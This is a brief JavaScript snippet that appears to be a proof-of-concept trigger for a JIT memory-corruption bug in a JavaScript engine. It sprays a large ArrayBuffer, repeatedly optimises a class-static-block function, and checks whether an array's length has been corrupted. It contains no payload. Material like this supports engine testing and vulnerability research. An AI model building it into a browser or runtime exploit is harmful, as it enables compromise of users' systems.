const pad1 = "";
const pad2 = "";
const pad3 = "";
const pad4 = "";
let v1;
var cor = [1.1];
var obj_arr = [cor, cor];
var dbl_arr = [1.1];

new ArrayBuffer(0x7fe00000);

function f() {
  class C {
    static {
      v1 = cor;
    }
  }
  C[1] = 0x8000;
}

for (var i = 0; i < 0x2000; i++) {
  f();
  f();
  f();
  f();
}

console.log("length:", cor.length);